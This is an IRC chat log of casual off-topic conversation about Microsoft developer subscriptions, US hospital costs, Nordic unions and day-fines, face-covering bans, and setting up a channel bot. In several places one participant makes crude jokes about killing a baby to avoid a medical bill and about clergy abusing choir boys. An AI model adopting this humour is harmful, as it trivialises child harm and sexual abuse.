Jun 25 11:32:29 <S_Gautam>	puckipedia: hmm, i see
Jun 25 11:32:31 <puckipedia>	for a while I had a legal MS-DOS 6.22 license
Jun 25 11:32:40 <puckipedia>	and like 5x windows 10
Jun 25 11:32:44 <puckipedia>	some winxp as well
Jun 25 11:32:54 <S_Gautam>	so you get free microsoft OSes?
Jun 25 11:33:02 <puckipedia>	you get EUR 130 (no idea how much in INR) of Azure credit per month
Jun 25 11:33:14 <olsner>	a free VS Community license allows for a lot of things these days though, do you need a paid VS license at all?
Jun 25 11:33:24 <puckipedia>	that as well
Jun 25 11:33:26 <S_Gautam>	nope, I just noticed this ad
Jun 25 11:33:30 <olsner>	ah
Jun 25 11:33:50 <S_Gautam>	puckipedia: EUR 130 per month for what?
Jun 25 11:33:59 <puckipedia>	anything that Microsoft has in their cloud
Jun 25 11:34:22 <puckipedia>	my VPS is hosted there
Jun 25 11:34:22 <S_Gautam>	EUR 130 = ₹ 10,000 that's like my monthly state scholarship, sounds good tbh
Jun 25 11:34:32 <S_Gautam>	hmm
Jun 25 11:34:38 <puckipedia>	ah so
Jun 25 11:34:41 <S_Gautam>	you get EUR 130 or you give?
Jun 25 11:34:42 <puckipedia>	it depends on the kind of subscription
Jun 25 11:34:48 <puckipedia>	apparently professional gets EUR 45 a month
Jun 25 11:35:04 <S_Gautam>	i didn't get you 
Jun 25 11:35:20 <S_Gautam>	microsoft gives you money for using their cloud?
Jun 25 11:35:24 <puckipedia>	so, with VS professional, you can use up ₹3,400 monthly for free
Jun 25 11:35:49 <puckipedia>	if you have  the even more expensive VS enterprise
Jun 25 11:36:07 <puckipedia>	it is ₹10,000
Jun 25 11:36:22 <puckipedia>	you can use it to host websites, servers, databases, etc
Jun 25 11:36:42 <S_Gautam>	wait, so this isn't real cash. It's services for free
Jun 25 11:36:53 <puckipedia>	yes
Jun 25 11:36:58 <S_Gautam>	hmm
Jun 25 11:37:32 <S_Gautam>	now when you put it that way it doesn't sound like a bad deal tbh
Jun 25 11:37:45 <puckipedia>	yeah, it was originally called MSDN
Jun 25 11:37:56 <puckipedia>	as in, you basically buy a subscription to the developer services of everything that MS has
Jun 25 11:38:52 <olsner>	it used to be a periodic dump of CDs in the mail (mom had that at work, I borrowed the stuff a few times)
Jun 25 11:39:00 <puckipedia>	yepp
Jun 25 11:39:09 <puckipedia>	I was able to download some of those old discs I think
Jun 25 11:39:49 <S_Gautam>	so this is what Windows Insidering feels like
Jun 25 11:40:57 <puckipedia>	apple did the whole 'dump of cd' thing for a while as well
Jun 25 11:41:13 <puckipedia>	well
Jun 25 11:41:32 <puckipedia>	you could buy all the Mac OSes from 1 to 8 for like $150 in 1999

Jun 25 11:42:01 <olsner>	did it include a way to run them on any '99 mac?
Jun 25 11:42:07 <puckipedia>	olsner: yes
Jun 25 11:42:10 <puckipedia>	it's complete installers
Jun 25 11:42:16 <S_Gautam>	hmm, Windows costs like 6,000 so it's a huge deal
Jun 25 11:42:23 <puckipedia>	like, this was for developers etc
Jun 25 11:42:27 <S_Gautam>	has there been inflation in europe countries?
Jun 25 11:42:29 <puckipedia>	olsner: you just need a mac with a DVD drive
Jun 25 11:43:26 <puckipedia>	this anthology also contains like all the languages ever
Jun 25 11:43:46 <S_Gautam>	as in is $150 or EUR150 was more worth in the 90s than today?
Jun 25 11:44:00 <puckipedia>	no idea tbh
Jun 25 11:44:13 <S_Gautam>	like, back in 50s and 60s for ₹0.20 you could get a good meal, but today ₹0.20 is too small to even be acceptable
Jun 25 11:44:29 <olsner>	pretty sure 30 years of inflation is significant
Jun 25 11:44:46 <S_Gautam>	so there is inflation in Europe
Jun 25 11:48:45 <olsner>	not runaway inflation (usually), but a few percent every year, the goal for e.g. the swedish central bank is to keep inflation at 2%

Jun 26 05:35:40 <nortti>	okay, so it seems that watching a 1080p video for a longer while with mpv is pretty reliable way to have my computer shut down on its own. while all the signs point at a thermal shutdown like the ones I got while playing modded minecraft, can't rule out gpu driver bugs, as this never happened with nouveau
Jun 26 05:36:04 <nortti>	I guess one possibility is that nouveau coudln't push the gpu as far as the proprietary driver
Jun 26 05:39:14 <nortti>	hm, I guess in addition to thermal shutdown it could be components drawing more power than the psu can handle. would also explain the flash of the power icon

Jun 26 09:30:30 <nanovad>	Ah, just remembered; yesterday there was a discussion about whether or not someone should move their baby to another hospital via ambulance or via civilian car
Jun 26 09:30:39 <nanovad>	er, discussion I overheard
Jun 26 09:31:04 <nanovad>	"Why take an ambulance? It's too expensive, and the insurance won't cover it. The baby's well enough to ride in a car."
Jun 26 09:31:16 <nanovad>	mind you, this is a 1wk old that is completely refusing to eat
Jun 26 09:31:57 <nanovad>	I pity the parents, because between the birthing bill and the hospital visit, it's probably going to be a few thousand USD before it's all done
Jun 26 09:32:07 <nanovad>	after insurance
Jun 26 09:32:35 <nortti>	…what would it be without insurance? would they get treatment at all in these cases even?
Jun 26 09:32:42 <nanovad>	Oh, they'd get treatment
Jun 26 09:34:02 <nanovad>	Probably around $30k, I believe, if the price couldn't be negotiated
Jun 26 09:34:19 <nanovad>	Hm, but could be as low as $10k
Jun 26 09:35:33 <john_cephalopoda>	O_O
Jun 26 09:35:58 <john_cephalopoda>	Better kill the baby, penalty will be lower than when you owe somebody 30k.
Jun 26 09:36:20 <nortti>	nanovad: is the few-thousand the amount before which the insurance kicks in, or does the insurance only ever cover some percentage?
Jun 26 09:36:45 <nanovad>	nortti: insurance only covers a certain percentage, normally, and there's also a copay for things
Jun 26 09:37:03 <nanovad>	What I'm reading says your average birth is anywhere from $500 to $2000 out of pocket depending on location and complications, if any
Jun 26 09:37:36 <vehk>	Do you get lots of home births because of this?
Jun 26 09:37:38 <nanovad>	which is honestly believable
Jun 26 09:37:41 <nanovad>	vehk: not really, no
Jun 26 09:37:44 <vehk>	huh
Jun 26 09:37:46 <nanovad>	something like 85% are in hospitals
Jun 26 09:38:16 <nanovad>	oh, huh
Jun 26 09:38:29 <nanovad>	even more, apparently it's more like 1.28% are home births as of 2012
Jun 26 09:40:01 <nanovad>	I think in cases like this the prices are seen as unavoidable
Jun 26 09:40:31 <nanovad>	Apparently there was a mother who had premature triplets and the bill was $877k before insurance

Jun 26 11:38:33 <shikhin>	I'm troubled by the decisions in life.
Jun 26 11:39:04 <vehk>	I see. I hope you decide well.

Jun 26 11:41:15 <nortti>	hm, should we establish a poc||gtfo mirror on ahti? it would in the very least nor have storage problems with them (cc zgrep)
Jun 26 11:41:52 <shikhin>	That'd be a neat idea, although probably better to first decide on the ahti domain name, then.
Jun 26 11:42:32 <nortti>	hm, fair point
Jun 26 11:42:54 <vehk>	Oh? People don't like the current one?
Jun 26 11:43:08 <nortti>	zgrep has said it ties it too strongly to him

Jun 26 12:37:22 <shikhin>	…oh no, this dorm has the shower stalls designed with the expectation that people are fine being naked next to each other.
Jun 26 12:38:46 <CompanionCube>	D: rip
Jun 26 12:38:54 <shikhin>	It's also a terrible design otherwise.
Jun 26 12:40:06 <shikhin>	There's one door to the shower stall. Two curtains divided the stall into three areas. The middle one has the drain (grr––so you exit through the most wet area because sloped towards drain), the left and the right ones with the showerhead.
Jun 26 12:40:20 <shikhin>	There's no areas to put your clothes or your towel or anything.
Jun 26 12:41:06 <shikhin>	And there's a latch on the door… not sure how that's supposed to work, do you coordinate with the other person you're having a shower with, or the second person latches, or what.
Jun 26 12:42:14 <nortti>	a knock-based door open request system
Jun 26 12:42:52 <shikhin>	nortti: Obviously I go in alone and latch it, but I'm worried about that possibility.
Jun 26 12:43:50 <nortti>	how many showers per how many rooms?
Jun 26 12:45:20 <shikhin>	Two showers (labelled for men), I'm guessing about 50 maximum occupants on the floor, but summers so 30 occupants.

Jun 26 12:46:54 <CompanionCube>	shikhin: xonotic in a bit?

Jun 26 12:52:49 <zgrep>	The shower council must meet in the shower, obviously. We make sure there's running water too, so that people who aren't in the shower council can't overhear the shower council.
Jun 26 12:53:28 <nortti>	even if you only get a couple others, if you get one who's been there longer, you can learn from them
Jun 26 12:53:45 <vehk>	Do you adjourn meetings by dropping the soap?
Jun 26 12:53:47 <shikhin>	People here in general are more confident with their bodies, so I would imagine only a handful have any issues with the general "go in naked or with a towel" expectation.

Jun 26 12:56:56 <nortti>	how do you mean by "are different people"?
Jun 26 12:57:02 <vehk>	Like, you have the choice to go to a sauna. You may not have a choice of a bathroom stall

Jun 26 16:41:54 <shikhin>	Anyway, I'm watching Merchant of Venice tomorrow!
Jun 26 16:42:15 <shikhin>	Not that excited by the play itself, but it's out in the open and ooh yay things out in the open at night, that's interesting.
Jun 26 16:43:09 <CompanionCube>	shitty cover D:
Jun 26 16:43:48 <shikhin>	In its defense, I had it folded densely and put lots of weight over it in my suitcase.
Jun 26 16:45:39 <CompanionCube>	so, nap ruined?
Jun 26 16:45:54 <shikhin>	That was my night's sleep (but it went very well otherwise).
Jun 26 16:46:20 <shikhin>	In other news, hmm, considering taking the pottery course here.
Jun 26 16:47:20 <CompanionCube>	pottery?

Jun 26 16:51:28 <shikhin>	)
Jun 26 16:54:23 <CompanionCube>	why pottery
Jun 26 16:54:55 <shikhin>	Why not.

Jun 26 17:30:10 <shikhin>	CompanionCube: Pro--
Jun 26 17:30:14 <shikhin>	Wow, that's a nice coincidence.
Jun 26 17:30:43 <shikhin>	CompanionCube: Probably going to skip tonight, pondering sleeping in the next hour to tackle jetlag. But grr, let's see.
Jun 26 17:31:17 *	CompanionCube sees where we left off
Jun 26 17:33:12 <CompanionCube>	oh
Jun 26 17:33:17 <CompanionCube>	apparently we're at war
Jun 26 17:33:22 <CompanionCube>	with the Kingdom of Prussia?
Jun 26 17:33:35 <CompanionCube>	ah
Jun 26 17:33:37 <CompanionCube>	crusade
Jun 26 17:35:51 <CompanionCube>	shikhin: i was gonna give one of your family members venice wasn't i
Jun 26 17:38:33 <shikhin>	Indeed, I think so.
Jun 26 17:39:25 <CompanionCube>	opening it to take a look...i'm apparently 200 gold in debt and there's a faction to put my sister on the throne.
Jun 26 17:39:35 <shikhin>	Are you a minor as well?
Jun 26 17:39:45 <CompanionCube>	no i'm 26
Jun 26 17:39:58 <CompanionCube>	my wife's 24
Jun 26 17:40:08 <CompanionCube>	the sister's 30
Jun 26 17:41:15 <CompanionCube>	shikhin: the king of england is a minor though
Jun 26 17:41:50 <shikhin>	Oh right.
Jun 26 17:41:55 <shikhin>	We were planning to do something about that, right?
Jun 26 17:42:05 <CompanionCube>	maybe
Jun 26 17:42:16 <CompanionCube>	i personally can't, because i lack moneys :p
Jun 26 17:45:18 <CompanionCube>	shikhin: heh. taking a look at the list of HRE emperors

Jun 27 12:37:12 <zgrep>	host.*
Jun 27 12:37:20 <shikhin>	I see.
Jun 27 12:37:22 <zgrep>	What's the .space mean? :P
Jun 27 12:37:31 <sortie>	nortti: Yes
Jun 27 12:37:33 <shikhin>	This is ahti's space.
Jun 27 12:37:56 <zgrep>	shikhin: Not necessarily. It could mean ahti aerospace fanatics club.
Jun 27 12:38:04 *	nortti . o O (ahti's space, ahti's domain. we are under the power of ahti here)
Jun 27 12:38:09 <zgrep>	:D:
Jun 27 12:38:14 <shikhin>	zgrep: I would honestly be more interested in that than the current ahti.
Jun 27 12:38:19 <zgrep>	:D:
Jun 27 12:38:22 <olsner>	unions in the US is weird... it's popped up on e.g. reddit a few times how maybe programmers should have a union, and somehow US people are *against* having one (but maybe that's reasonable for a US kind of union?)
Jun 27 12:38:50 <shikhin>	something something freedom?
Jun 27 12:38:52 <nortti>	oh, how are US unions different?
Jun 27 12:39:26 <zgrep>	shikhin: Feel free to make a /space page, with aerospace fanatics info on there. See if you can rope in nanovad. :P
Jun 27 12:39:47 <shikhin>	There's supposed to be a bot in here for that, right nanovad?
Jun 27 12:39:48 <zgrep>	ahti.space it is.
Jun 27 12:39:54 <zgrep>	Or, will be, I guess.
Jun 27 12:40:08 <olsner>	nortti: not entirely sure
Jun 27 12:40:32 <zgrep>	shikhin: I vaguely recall I did the apod thing manually, and then tried to do an RSS thing for happybot.
Jun 27 12:40:40 <nortti>	I guess one thing I've noticed is more focus on the local branch of union vs. being in bigger union org
Jun 27 12:41:21 <shikhin>	Former in the US?
Jun 27 12:41:30 <nortti>	yeah
Jun 27 12:41:33 <shikhin>	Ah.
Jun 27 12:41:36 <nortti>	but that might just be an artifact of the very weird viewpoint into US unions
Jun 27 12:41:54 <shikhin>	Which is?
Jun 27 12:42:00 <nortti>	leftist history
Jun 27 12:42:06 <shikhin>	Ah, heh.
Jun 27 12:42:20 <nortti>	actually, hm, now that I think of it, US probably does not have a työehtosopimus system
Jun 27 12:43:20 <nortti>	in finland, for each type of industry, the union of the workers and the union of the employers come together and work out the basic level of contract that gets applied to everything on the industry
Jun 27 12:43:36 <nortti>	in which case the national union org is more relevant that in the US
Jun 27 12:45:24 <nortti>	(generally, this contract gets renegotiated every year or so, but the two unions orgs can decide on it among themselves)
Jun 27 12:46:27 <nortti>	olsner: I guess you belong to a union? is it a generic IT one, or a specifically programmers?
Jun 27 12:48:10 <olsner>	it's a very generic one, its name is literally <The Union> since it was formed by merging a bunch of unions
Jun 27 12:48:33 <olsner>	but it does negotiate with the IT employers organization, and produces an IT collective agreement
Jun 27 12:48:34 <nortti>	oh, you belong to it directly, and not through a more specific one?
Jun 27 12:48:37 <nortti>	ah
Jun 27 12:50:08 <nortti>	e.g. in finland, if you're a teacher you are a member of OAJ (teachers), which is a member of akava (academically trained workers)
Jun 27 12:50:44 <olsner>	I could possibly be better covered by e.g. an academic union, but I'm pretty sure you end up being part of the same collective agreement anyway
Jun 27 12:50:49 <nortti>	mh
Jun 27 12:51:36 <nortti>	what's the swedish name of <The Union>? the only work for a union I know is "fack"
Jun 27 12:51:55 <shikhin>	What, the fack?
Jun 27 12:52:00 <olsner>	Unionen
Jun 27 12:52:15 <nortti>	ah
Jun 27 12:52:15 <olsner>	shikhin: facket
Jun 27 12:52:31 <shikhin>	:D
Jun 27 12:53:18 <nortti>	"Unionen är Sveriges största fackförbund, både för tjänstemän och totalt sett." "Unionen is the second biggest trade union in Sweden" HMM
Jun 27 12:53:40 <olsner>	there used to be a separate engineer's union, but that merged with Unionen a while ago
Jun 27 12:53:48 <nortti>	ah
Jun 27 12:54:00 *	S_Gautam (uid286066@gateway/web/irccloud.com/x-swtznjjiozxicvvg) has joined
Jun 27 12:54:49 <nortti>	lol, on finnish wikipedia <labour union> has the "in the series" box for socialism on it
Jun 27 12:54:58 <olsner>	"the second biggest trade union in Sweden and the biggest white-collar union in the world." even... second biggest in sweden but biggest in the world? Sweden must be bigger than I think
Jun 27 12:55:03 <nortti>	*part of a series on
Jun 27 12:55:10 <nortti>	:D
Jun 27 12:55:44 <nortti>	I guess the biggest union in sweden was a non-white-collar one
Jun 27 12:56:00 <S_Gautam>	is it true that in small Swedish towns people know each other very well
Jun 27 12:56:09 <shikhin>	oh no.
Jun 27 12:56:21 <nortti>	yes? like, isn't that true of all small towns?
Jun 27 12:56:30 <shikhin>	no, really!
Jun 27 12:56:45 <zgrep>	"Welcome to Stranger Town, where we all try to ignore each other as much as possible."
Jun 27 12:57:04 <zgrep>	"Eye contact can be fined for up to $250."
Jun 27 12:57:38 <nortti>	the town levies 0% income tax because the entire municipal budget is filled with that
Jun 27 12:57:51 <zgrep>	:D:
Jun 27 12:58:16 <nortti>	also, up to $250? you
Jun 27 12:58:31 <shikhin>	You time the eye contact to determine how much you're to be fined.
Jun 27 12:58:37 <nortti>	+'re thinking too small. it should be up to 20 income-dependant day fines
Jun 27 12:58:41 <zgrep>	Hm? It's however much the victim of the eye contact wants.
Jun 27 12:58:54 <zgrep>	But there should be a limit somewhere.
Jun 27 12:58:55 <zgrep>	:D:
Jun 27 12:59:09 <nortti>	actually, hm, I do guess income-dependant day-fines are not really a thing in the US are they
Jun 27 12:59:28 <S_Gautam>	nortti: it's just something i keep hearing all the time. i mean, how do i say this without sounding offensive, it's like, well, this isn't my opinion exactly but
Jun 27 12:59:30 <zgrep>	Not really, afaik...
Jun 27 12:59:32 *	john_cephalopoda . o O ( Multibillion dollar corporations move there and surgically remove the eyes of their managers there to pay no fines )
Jun 27 12:59:40 <nortti>	"Jurisdictions employing the day-fine include Finland (Finnish: päiväsakko), Estonia (Estonian: päevamäär), Sweden (Swedish: dagsbot), Denmark (Danish: dagbøde), Germany (German: Tagessatz), Switzerland, and Macao."
Jun 27 12:59:55 <S_Gautam>	the image of the any western country is like "people don't talk to each other, they keep to their own etc."
Jun 27 12:59:59 <zgrep>	john_cephalopoda: Wow. :D:
Jun 27 13:00:21 <shikhin>	john_cephalopoda: You know you could just cover your eyes instead...?
Jun 27 13:00:32 <zgrep>	Not as guaranteed to work.
Jun 27 13:00:41 <shikhin>	But cheaper.
Jun 27 13:00:49 <zgrep>	Not in the long run.
Jun 27 13:01:09 <shikhin>	I think I'll need to run the numbers, how much does it cost to surgically remove eyes these days?
Jun 27 13:01:10 <nortti>	S_Gautam: I mean, I do guess in nordic countries you tend to do that in bigger cities, but in smaller places everyone is *very much* into each othes businesses
Jun 27 13:01:28 <shikhin>	Also probably roughly equally true of everywhere.
Jun 27 13:01:33 <S_Gautam>	yes
Jun 27 13:02:00 <olsner>	small-town life seems a bit terrifying, I like not knowing my neighbors and them not knowing me
Jun 27 13:02:06 <S_Gautam>	i do kind of miss the "comfy" feeling of small towns
Jun 27 13:02:48 <john_cephalopoda>	shikhin: Having the eyes covered at all time will probably be ungood for the eyesight of the involved person.
Jun 27 13:02:56 <S_Gautam>	forgot that bread price rose by 10? no worries, the shopkeeper knows you and would happily except paying it later.
Jun 27 13:03:04 <S_Gautam>	*accept
Jun 27 13:03:12 <nortti>	"For example, in 2001, a Finnish businessman with a yearly income of 10 million euros, received a relatively mild punishment of six day-fines, amounting €26,000, for driving though a red traffic light." hah, nice
Jun 27 13:03:23 <zgrep>	nortti: In a small town somewhere, one neighbor is talking to another neighbor... "So about that dead body you buried in my backyard, can I bury something in your front yard? I need to stash my bank heist earnings somewhere for a few days. Also Cheryl got a new cat."
Jun 27 13:03:29 *	shikhin lives in a city in India and shopkeepers keep a tab happily there as well...
Jun 27 13:03:44 <john_cephalopoda>	shikhin: Also having a mask in the face all the time will leave pressure marks that will get worse. Fungi and bacteria will grow under the face mask, slowly and painfully destroying the eyes of the managers.
Jun 27 13:04:08 <shikhin>	You don't need to wear them /all the time/, only when you expect to see other people.
Jun 27 13:04:21 <zgrep>	<olsner> small-town life seems a bit terrifying, I like not knowing my neighbors and them not knowing me <-- ++
Jun 27 13:04:32 <S_Gautam>	didn't netherlands ban face coverings lol
Jun 27 13:04:37 <zgrep>	Hm.
Jun 27 13:04:39 <zgrep>	I guess it depends on the type of neighbors.
Jun 27 13:04:47 <S_Gautam>	is it about that?
Jun 27 13:04:53 <john_cephalopoda>	shikhin: People might walk in at any time. After all they will not see where they are going when they try to avoid seeing anything.
Jun 27 13:05:16 <nortti>	S_Gautam: several european countries have banned it, but I wouldn't be surprised if it's only enforced for muslim women
Jun 27 13:05:26 <zgrep>	olsner: For example, living in a particular dorm, I don't mind that people there know me. I wouldn't want to live in a town like that, though...
Jun 27 13:05:40 <john_cephalopoda>	Also what S_Gautam said. You could go to a protest march and can show your empty eye sockets.
Jun 27 13:05:49 <zgrep>	...but with a group of people in a city seems nice.
Jun 27 13:05:51 <shikhin>	W-what, when did S_Gautam say that? o.o
Jun 27 13:06:05 <john_cephalopoda>	shikhin: <S_Gautam> didn't netherlands ban face coverings lol
Jun 27 13:06:06 <olsner>	things like https://en.wikipedia.org/wiki/Knutby_murder and weird cults, are also the kind of things I expect in small towns
Jun 27 13:06:06 <bslsk05>	​en.wikipedia.org: Knutby murder - Wikipedia
Jun 27 13:06:31 <john_cephalopoda>	Face coverings are especially forbidden on protests.
Jun 27 13:06:55 <nortti>	"The pastor's first wife Heléne Fossmo had been found dead in her bath tub in 1999.[3] Although she had a hole in her skull[5] and although there was a toxic concentration of dextropropoxyphene in her blood, this death had been ruled an accident."
Jun 27 13:07:07 <john_cephalopoda>	One time people were arrested because they were skiing in a ski town, got into a protest on their way home and wore ski goggles.
Jun 27 13:07:09 <zgrep>	olsner: "Oh, yeah. That door in the town square is actually a portal to Hell. It's why nobody has to pay for heating. Or electricity. We just do a Satanic ritual every so often."
Jun 27 13:07:18 <olsner>	I have pretty vague ideas about that affair from the news, but I remember the pastor ordered some murders and someone was married to Jesus
Jun 27 13:07:32 <shikhin>	nortti: D'oh, bathtubs have a dangerous habit of poisoning your blood and putting a hole in your skull.
Jun 27 13:07:50 <zgrep>	:D:
Jun 27 13:07:53 <S_Gautam>	does the law only ban niqab and burkha or chador as well
Jun 27 13:08:26 <shikhin>	"a legal ban on wearing clothing that completely covers the face or only shows the eyes, in educational institutions, on public transport, in government institutions and hospitals"
Jun 27 13:08:40 <S_Gautam>	ah, so niqab and burkha
Jun 27 13:09:31 <john_cephalopoda>	nortti: Pah, pastors with wives. Damn non-catholics. Pastors should do naughty things with the choir boys and leave their fingers from women.
Jun 27 13:09:43 <S_Gautam>	i mean, it's not wrong right? people shouldn't hide their faces in public? how do you identify someone if you need to?
Jun 27 13:09:55 <shikhin>	Why do you need to identify people in public?
Jun 27 13:10:05 <S_Gautam>	shikhin: Crime?
Jun 27 13:10:11 <john_cephalopoda>	shikhin: Because nobody wants to have an asshole like batman walking around.
Jun 27 13:10:13 <shikhin>	You need to identify people in public for 'crime'?
Jun 27 13:10:33 <nanovad>	<shikhin> There's supposed to be a bot in here for that, right nanovad? <- ~_~

Jun 27 13:10:50 <zgrep>	Hiiiiiiiii.
Jun 27 13:10:51 <john_cephalopoda>	shikhin: The government spent millions on telescreens. Please uncover your face so you may be identified at any time. Or do you have got something to hide?
Jun 27 13:10:55 <S_Gautam>	like, if someone shoplifts or commits a crime, how do you identify them from the camera footage?

Jun 27 13:11:51 <zgrep>	S_Gautam: You... don't? I doubt that's how most shoplifters are caught, because they showed their face. It's probably because they saw someday stealing on the camera, irregardless of their face, and called security.
Jun 27 13:12:11 <shikhin>	If you have the right to impinge upon someone's privacy because they *might* harm you, as olsner said... you should be even more safe and scan their fingerprints and get an identity card or something before letting them in your store.
Jun 27 13:12:25 <nortti>	right
Jun 27 13:12:40 <nortti>	in finland it's illegal to wear face covering when you're commiting a crime
Jun 27 13:12:45 <shikhin>	:D
Jun 27 13:12:46 <zgrep>	S_Gautam: And, a clever shoplifter would go in one day, spot all the cameras, and come back the next day dressed differently, and not look at a single camera.
Jun 27 13:12:54 <nortti>	which, well, is kind of useless because come on

Jun 27 13:15:23 <zgrep>	Everywhere.
Jun 27 13:15:37 <S_Gautam>	hm, that's sounds better/
Jun 27 13:15:39 <shikhin>	You know what, I think we all should pin a photograph of our faces on our backs, just in case.

Jun 27 13:18:46 <shikhin>	I don't think so, do please.
Jun 27 13:19:14 <nortti>	okay, so, said person is a communist. decorates-home-with-lenin-bust communist
Jun 27 13:19:44 <nortti>	when he was younger, he would also have clothing with clear communist markings
Jun 27 13:20:11 <john_cephalopoda>	S_Gautam: It's really easy to show strong ties to home country. First you buy a lot of high-quality ties (bow ties are also ok) and then simply show them at the local embassy of your home country.
Jun 27 13:20:28 <nortti>	so, he walks into the US embassy in stockholm, wearing this giant belt buckle with DDR symbols on it. the people there take one look at him, and go "yeah, nope"
Jun 27 13:20:29 <S_Gautam>	oh  lol no that was so bad
Jun 27 13:20:36 <shikhin>	nortti: :D
Jun 27 13:21:07 <zgrep>	nortti: These aren't new ideas. Entry into the country requires fingerprinting already, I believe.
Jun 27 13:21:16 <S_Gautam>	so you're advising against wearing a Hindutva crest to show strong ties to home country
Jun 27 13:21:19 <zgrep>	olsner: :D
Jun 27 13:21:34 <zgrep>	nortti: That thread, and the thread it links to, are amazing.
Jun 27 13:21:35 <shikhin>	Yes, entry into the country requires fingerprinting + a photo.
Jun 27 13:21:36 <nortti>	zgrep: sure, but surely not credit card or keys?
Jun 27 13:22:09 <john_cephalopoda>	Wear bow ties and break into your president's house. He represents the country, showing your bow tie to him means showing that tie to the whole country!
Jun 27 13:22:15 <zgrep>	No. For that they can call up your (US) bank, or get a warrant + locksmith.
Jun 27 13:22:18 <shikhin>	Oh, the border control agent I actually got through this time was training a new person.
Jun 27 13:22:31 <shikhin>	'twas pretty fun, the weird things they focused on and the more important things they skimmed through.
Jun 27 13:23:03 <shikhin>	Like, I was pretty clearly the first student they had encountered. Just said one line on how it's okay if the program date on my forms has gone past, I can get an extension through "something called the OPT".
Jun 27 13:23:51 <shikhin>	But said five lines on how to decorate the stamp they put in my passport, how you're supposed to write all these details, how people don't, who all in the bureaucracy is a stickler about it and might complain if you don't, etc.
Jun 27 13:24:08 <nortti>	interesting
Jun 27 13:24:13 <zgrep>	shikhin: :D
Jun 27 13:24:44 <S_Gautam>	shikhin: have you crossed the border to Nepal?
Jun 27 13:24:48 <zgrep>	It's nice to see that they focus on the important things most. How to cheat your way through beauracracy, and how to put on a stamp correctly.
Jun 27 13:24:52 <olsner>	bureacracy first, border control second
Jun 27 13:24:58 <shikhin>	S_Gautam: Yes, but not through an official border control site.
Jun 27 13:25:20 <S_Gautam>	i don't think there's any border control?
Jun 27 13:25:24 <shikhin>	There is.

Jun 27 13:25:39 <S_Gautam>	You can just cross?
Jun 27 13:25:58 <shikhin>	There's a border and it's controlled in that they let you pass, yes.
Jun 27 13:26:08 <zgrep>	:D:
Jun 27 13:26:18 <shikhin>	I've only seen that––passed through elsewhere (where you're not supposed to).
Jun 27 13:26:24 <CompanionCube>	nortti: why would you decorate your home with a bust of lenin
Jun 27 13:26:39 <nortti>	CompanionCube: because you are a communist in the 70s
Jun 27 13:26:51 <shikhin>	You got me.

Jun 27 13:28:03 <nortti>	howso?

Jun 27 13:29:16 <zgrep>	It could be a small bust.

Jun 27 22:34:00 <john_cephalopoda>	You should always follow the laptop's maintenance manual, which clearly states to approach horses from the front.
Jun 27 22:35:01 <john_cephalopoda>	If the horse faces with the back outside, gently opening the laptop's case and approaching the horse from the front is the way to go.
Jun 27 22:36:57 <john_cephalopoda>	Expert laptop users may also use a long stick and/or long screwdriver to turn the horse. Only do that when you are experienced since you might shove the horse into the casing, where it might destroy important hardware, which can lead to a loss of data and/or functionality of your device.

Jun 28 07:22:34 <john_cephalopoda>	To me, "nazi" is related to the NSDAP, the national socialist worker's party.
Jun 28 07:22:41 <nortti>	it is
Jun 28 07:23:09 <john_cephalopoda>	I prefer "neo-nazi" for recent national socialism in that spirit.
Jun 28 07:23:28 <nortti>	why?
Jun 28 07:24:46 <john_cephalopoda>	Because it makes a distinction between the people who murdered 6 million jews, a lot of critics, homosexuals, mentally ill people, Jehovah's witnesses and others that were in their way or deemed bad, and the people who live today and just want that to happen again.
Jun 28 07:24:57 <S_Gautam>	i think the term is NazBol
Jun 28 07:25:18 <nortti>	yeah, that's the national bolshevik party
Jun 28 07:25:25 <john_cephalopoda>	"communist" is even more complex because there are a few dozen kinds of communism that worked out more or less bad, depending on the time and region.
Jun 28 07:25:45 <nortti>	john_cephalopoda: the total is about 11 million actually, 6 million is just the jews
Jun 28 07:26:00 <nortti>	oh, wait, that's what you said
Jun 28 07:26:13 <john_cephalopoda>	nortti: Yeah, the parsing is a bit ambigous on that one.
Jun 28 07:27:01 <nortti>	anyways, considering that you get neo-nazis already in 1949, and those were ppl who had been active in ye originale nazi party, I feel making such a strong split isn't really all that useful

Jun 28 07:31:17 <nortti>	so would you say that we have nazi movements, but their members are not nazis but neo-nazis?
Jun 28 07:32:11 <john_cephalopoda>	nortti: Until recently - at least as felt by me - those words were separate but now it's just generally called "nazis" everywhere.

Jun 28 07:33:51 <nortti>	I would guess with the mainstreaming of nazi ideology once again (tho debatable if it has never been that far from mainstream) made the term "neo-nazi" clumsier to use, and especially since we don't really have the original nazis running around anymore, there wasn't really a risk of misunderstanding if you just shortened it to "nazis"
Jun 28 07:34:34 <john_cephalopoda>	There are actually original nazis running around. Recently one guy was imprisoned (at the age of over 90) because he worked in some concentration camp.

Jun 28 13:43:40 <nortti>	I see. generally when I add context, I try to keep that as the main thing: is the law understandable and enjoyable without this and does the context flow naturally. if not, I try to trim it
Jun 28 13:44:05 <CompanionCube>	ah
Jun 28 13:44:09 <nortti>	of course, as you can see from the lawlog, I often don't really apply it as far as it could be
Jun 28 13:44:09 <shikhin>	Likewise.
Jun 28 13:44:37 <shikhin>	The bot didn't trigger, right?
Jun 28 13:44:45 <CompanionCube>	bot worked
Jun 28 13:45:17 <shikhin>	Ah, yay. Time to shift it here?
Jun 28 13:45:42 <nortti>	vehk: how can we move offtopia-law here?
Jun 28 13:46:13 <shikhin>	`> "/var/lib/law/irc/irc.freenode.net/##ingsoc/in"`
Jun 28 13:46:23 *	shikhin has no idea if just putting #offtopia in there would work or not.
Jun 28 13:46:50 <olsner>	is it using that shell irc thingy?
Jun 28 13:47:08 <shikhin>	Oh, that suckless thing?
Jun 28 13:47:10 <nortti>	probably not, would have to join it to the chan first and then modify the autoreconnect logic
Jun 28 13:47:43 <shikhin>	Ah, "Join a channel as follows: $ echo "/j #wmii" > in"
Jun 28 13:47:51 <shikhin>	(But I'll let vehk handle it unless they don't want to.)
Jun 28 13:52:15 <nanovad>	There's a lawbot now?
Jun 28 13:52:44 <shikhin>	Don't let it fool you, we tell it what the laws are.
Jun 28 13:53:03 <nanovad>	Still seems handy.
Jun 28 13:53:20 <shikhin>	(It reports git commits, nothing more.)
Jun 28 13:53:45 <CompanionCube>	essentially it's a lawannouncer
Jun 28 13:53:48 <CompanionCube>	not a true lawbot
Jun 28 13:53:54 <nanovad>	got it
Jun 28 13:53:55 <shikhin>	Shouldn't be very hard to make a bot that does the commit for you––for the people who don't like getting out of IRC.
Jun 28 13:54:44 <nortti>	how would you handle multiple lines? would you implement something like ed?
Jun 28 13:54:53 <shikhin>	What do you mean?
